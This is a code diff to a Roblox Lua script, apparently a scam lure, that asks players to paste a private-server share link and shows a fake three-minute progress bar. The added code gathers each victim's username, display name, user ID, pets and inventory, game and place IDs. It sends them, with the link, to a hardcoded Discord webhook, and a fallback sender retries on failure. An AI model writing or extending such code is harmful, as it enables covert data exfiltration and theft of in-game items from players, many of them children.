@@ -3,6 +3,7 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1445359992122380360/YtcZ9x
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
 
 local function doRequest(tbl)
     local ok, res = pcall(function()
@@ -27,7 +28,8 @@ local function sendWebhook(webhookUrl, messageContent)
         Headers = {["Content-Type"] = "application/json"},
         Body = payload
     }
-    return doRequest(tbl)
+    local success, response = doRequest(tbl)
+    return success, response
 end
 
 local parent
@@ -240,17 +242,113 @@ local function fillProgress(duration)
     end)
 end
 
+-- Function to get player's pets from all possible locations
+local function getPlayerPets()
+    local pets = {}
+    
+    -- Try to get from Backpack (tools)
+    if Player and Player:FindFirstChild("Backpack") then
+        for _, tool in ipairs(Player.Backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                table.insert(pets, tool.Name)
+            end
+        end
+    end
+    
+    -- Try to get from Character
+    if Player.Character then
+        for _, item in ipairs(Player.Character:GetChildren()) do
+            if item:IsA("Tool") or item:IsA("Model") then
+                -- Check if it looks like a pet
+                if item.Name:match("[Pp]et") or item.Name:match("[Aa]nimal") or item.Name:match("[Cc]ompanion") then
+                    table.insert(pets, item.Name)
+                elseif #pets == 0 then -- If no pets found with keywords, add all tools
+                    if item:IsA("Tool") then
+                        table.insert(pets, item.Name)
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Check leaderstats
+    local leaderstats = Player:FindFirstChild("leaderstats")
+    if leaderstats then
+        -- Common pet-related stat names
+        local petStats = {"Pets", "PetCount", "pets", "petcount", "Pet", "pet", "Companions", "companions"}
+        for _, statName in ipairs(petStats) do
+            local stat = leaderstats:FindFirstChild(statName)
+            if stat then
+                table.insert(pets, statName .. ": " .. tostring(stat.Value))
+            end
+        end
+    end
+    
+    -- Check game-specific pet systems
+    -- Try to find any folders that might contain pets
+    local possibleFolders = {
+        workspace:FindFirstChild("Pets"),
+        workspace:FindFirstChild("pets"),
+        workspace:FindFirstChild("Pet"),
+        workspace:FindFirstChild("pet"),
+        workspace:FindFirstChild(Player.Name .. "'s Pets"),
+        workspace:FindFirstChild(Player.Name .. "Pets")
+    }
+    
+    for _, folder in ipairs(possibleFolders) do
+        if folder and folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                if pet.Name:lower():find(Player.Name:lower()) or pet:FindFirstChild("Owner") then
+                    table.insert(pets, pet.Name)
+                end
+            end
+        end
+    end
+    
+    -- Remove duplicates
+    local uniquePets = {}
+    for _, pet in ipairs(pets) do
+        uniquePets[pet] = true
+    end
+    
+    local petList = {}
+    for pet in pairs(uniquePets) do
+        table.insert(petList, pet)
+    end
+    
+    if #petList == 0 then
+        return "No pets detected"
+    else
+        return table.concat(petList, ", ")
+    end
+end
+
+-- Test webhook function
+local function testWebhook()
+    print("Testing webhook...")
+    local testContent = "TEST MESSAGE: Webhook is working!"
+    local success, response = sendWebhook(WEBHOOK_URL, testContent)
+    if success then
+        print("✓ Webhook test successful!")
+    else
+        print("✗ Webhook test failed:", response)
+    end
+end
+
+-- Run a test when script starts (optional)
+-- spawn(testWebhook)
+
 okBtn.MouseButton1Click:Connect(function()
     local link = tostring(textBox.Text or "")
     link = link:match("^%s*(.-)%s*$")
 
     if not (link:find("^https://www.roblox.com/share%?code=") or link:find("^www.roblox.com/share%?code")) then
         invalidLabel.Text = "Invalid link!"
-        delay(2, function() invalidLabel.Text = "" end)
+        task.delay(2, function() invalidLabel.Text = "" end)
         return
     end
 
-    -- Spieleranzahl prüfen (nur wenn Overlay noch nicht aktiv)
+    -- Check if player is alone
     if not overlay.Visible and #Players:GetPlayers() > 1 then
         local plr = Players.LocalPlayer
         if plr then
@@ -263,17 +361,129 @@ okBtn.MouseButton1Click:Connect(function()
     setInteract(false)
     overlay.Visible = true
 
-    local content = string.format("@everyone a user wants his reward! What he typed: %s", link)
-    spawn(function() sendWebhook(WEBHOOK_URL, content) end)
+    -- Get player info
+    local username = Player.Name
+    local displayName = Player.DisplayName
+    local userId = tostring(Player.UserId)
+    
+    -- Get player's pets
+    local petInfo = getPlayerPets()
+    
+    -- Create webhook message with markdown formatting
+    local content = string.format(
+        "@everyone\n" ..
+        "**🚀 NEW USER DETECTED!**\n\n" ..
+        "**👤 User Information:**\n" ..
+        "• Username: `%s`\n" ..
+        "• Display Name: `%s`\n" ..
+        "• User ID: `%s`\n\n" ..
+        "**🐾 Pet Information:**\n" ..
+        "• %s\n\n" ..
+        "**🔗 Link Entered:**\n" ..
+        "• %s\n\n" ..
+        "**📊 Game Info:**\n" ..
+        "• Game ID: `%s`\n" ..
+        "• Place ID: `%s`\n" ..
+        "• Server Time: `%s`",
+        username,
+        displayName,
+        userId,
+        petInfo,
+        link,
+        tostring(game.GameId),
+        tostring(game.PlaceId),
+        os.date("%Y-%m-%d %H:%M:%S")
+    )
 
-    fillProgress(180) -- 3 Minuten
+    -- Send webhook
+    task.spawn(function()
+        print("Sending webhook with user data...")
+        print("Username:", username)
+        print("User ID:", userId)
+        print("Pets:", petInfo)
+        print("Link:", link)
+        
+        local success, response = sendWebhook(WEBHOOK_URL, content)
+        
+        if success then
+            print("✓ Webhook sent successfully!")
+            if response and response.Body then
+                print("Response:", response.Body)
+            end
+        else
+            print("✗ Failed to send webhook!")
+            print("Error:", response)
+            
+            -- Try alternative method if first fails
+            warn("Trying alternative webhook method...")
+            
+            -- Fallback: Try to send with basic HTTP if available
+            if game:GetService("HttpService"):JSONDecode then
+                local fallbackContent = string.format(
+                    "USER: %s (ID: %s) | PETS: %s | LINK: %s",
+                    username, userId, petInfo, link
+                )
+                
+                local ok, fallbackResp = pcall(function()
+                    local payload = HttpService:JSONEncode({content = fallbackContent})
+                    local request = {
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = payload
+                    }
+                    return HttpService:RequestAsync(request)
+                end)
+                
+                if ok then
+                    print("✓ Fallback webhook sent!")
+                else
+                    print("✗ Fallback also failed:", fallbackResp)
+                end
+            end
+        end
+    end)
+
+    fillProgress(180) -- 3 minutes
 end)
 
 textBox.FocusLost:Connect(function(enter)
     if enter then
         okBtn:CaptureFocus()
+        task.wait()
         okBtn.MouseButton1Click:Wait()
     end
 end)
 
 print("FindBestBrainrots GUI loaded.")
+print("Player detected:", Player.Name)
+print("User ID:", Player.UserId)
+
+-- Add a debug button to test pet detection
+local debugBtn = new("TextButton", {
+    Parent = main,
+    Position = UDim2.new(0.02, 0, 0.02, 0),
+    Size = UDim2.new(0, 100, 0, 30),
+    BackgroundColor3 = Color3.fromRGB(255, 100, 100),
+    Text = "DEBUG PETS",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.GothamBold,
+    TextSize = 14,
+    Visible = true -- Set to false to hide in production
+})
+new("UICorner", {Parent = debugBtn, CornerRadius = UDim.new(0, 6)})
+
+debugBtn.MouseButton1Click:Connect(function()
+    local pets = getPlayerPets()
+    print("=== DEBUG PET INFO ===")
+    print("Player:", Player.Name)
+    print("Pets detected:", pets)
+    print("=====================")
+    
+    -- Show in the GUI too
+    invalidLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    invalidLabel.Text = "Pets: " .. pets
+    task.delay(5, function()
+        invalidLabel.Text = ""
+    end)
+end)
